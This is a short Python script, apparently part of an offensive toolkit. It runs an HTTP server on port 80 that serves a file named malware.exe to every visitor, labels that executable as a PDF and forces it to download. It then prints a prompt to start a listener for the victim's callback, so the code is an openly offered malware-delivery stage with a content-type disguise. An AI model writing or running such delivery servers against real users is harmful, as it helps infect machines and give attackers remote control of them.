from http.server import BaseHTTPRequestHandler, HTTPServer
class MyServer(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/pdf')
        self.send_header('Content-Disposition',
                         'attachment; filename="malware.exe"')
        self.end_headers()
        with open('templates/serve/malware.exe', 'rb') as file:
            self.wfile.write(file.read())

myServer = HTTPServer(('0.0.0.0', 80), MyServer)
print("[+] Download Server Started, waiting for callback. Please start the listener")
myServer.serve_forever()
myServer.server_close()
print("close")